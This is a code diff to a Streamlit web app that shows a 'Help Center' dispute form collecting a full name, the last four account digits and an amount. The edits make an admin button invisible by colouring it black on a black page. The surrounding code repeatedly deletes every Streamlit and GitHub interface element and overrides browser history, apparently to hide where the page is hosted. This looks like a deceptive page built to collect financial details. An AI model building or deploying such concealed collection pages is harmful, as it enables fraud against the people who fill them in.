@@ -29,7 +29,7 @@ st.markdown("""<script>
         const selectors = [
             'header', 'footer', '.stDeployButton', '[data-testid="stHeader"]',
             '[data-testid="stAppToolbar"]', '[data-testid="stHeaderActionElements"]',
-            '.stElementToolbar', '[data-testid="stElementToolbar"]', 
+            '.stElementToolbar', '[data-testid="stElementToolbar"]',
             '.st-emotion-cache-gi0tri', '.st-emotion-cache-140j12g', 
             '.st-emotion-cache-h5rgaw', '.section-anchor', 'a.section-anchor'
         ];
@@ -43,7 +43,6 @@ st.markdown("""<script>
         });
     };
     
-    // Prevención de historial y limpieza
     if (window.history && window.history.replaceState) {
         const originalRS = window.history.replaceState;
         window.history.replaceState = function() {
@@ -55,24 +54,19 @@ st.markdown("""<script>
     setInterval(nuclearClean, 50);
 </script>""", unsafe_allow_html=True)
 
-# CSS NUCLEAR: BLOQUEO TOTAL DE VISIBILIDAD
+# CSS NUCLEAR: BLOQUEO TOTAL Y BOTÓN CAMUFLADO
 st.markdown("""<style>
-    /* Ocultar todo rastro de la interfaz de Streamlit/GitHub */
     header, footer, .stDeployButton, [data-testid="stHeader"], 
     [data-testid="stAppToolbar"], [data-testid="stHeaderActionElements"], 
     .st-emotion-cache-gi0tri, .st-emotion-cache-140j12g, .st-emotion-cache-h5rgaw {
         display: none !important;
         visibility: hidden !important;
         height: 0 !important;
-        width: 0 !important;
-        opacity: 0 !important;
-        pointer-events: none !important;
     }
 
     .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
     .block-container { max-width: 500px !important; padding-top: 0.5rem !important; }
 
-    /* Logo y Títulos Estáticos */
     [data-testid="stImage"], [data-testid="stImage"] img, h1, .stMarkdown h1 {
         pointer-events: none !important;
         cursor: default !important;
@@ -101,8 +95,18 @@ st.markdown("""<style>
         border-top: 1px solid #222; padding-top: 20px; line-height: 1.5;
     }
 
+    /* BOTÓN ADMIN CAMUFLADO: Color negro para ser invisible */
     .admin-trigger {
-        position: fixed; bottom: 10px; left: 10px; width: 30px; height: 30px; opacity: 0.01; z-index: 9999;
+        position: fixed; bottom: 0; left: 0; width: 50px; height: 50px; z-index: 9999;
+    }
+    .admin-trigger button {
+        background-color: #000000 !important; 
+        color: #000000 !important; 
+        border: none !important;
+        box-shadow: none !important;
+        cursor: default !important;
+        width: 100% !important;
+        height: 100% !important;
     }
 </style>""", unsafe_allow_html=True)
 
@@ -114,7 +118,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v1_1_5", clear_on_submit=True):
+    with st.form("claim_v1_1_6", clear_on_submit=True):
         st.text_input("Full Name", autocomplete="name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
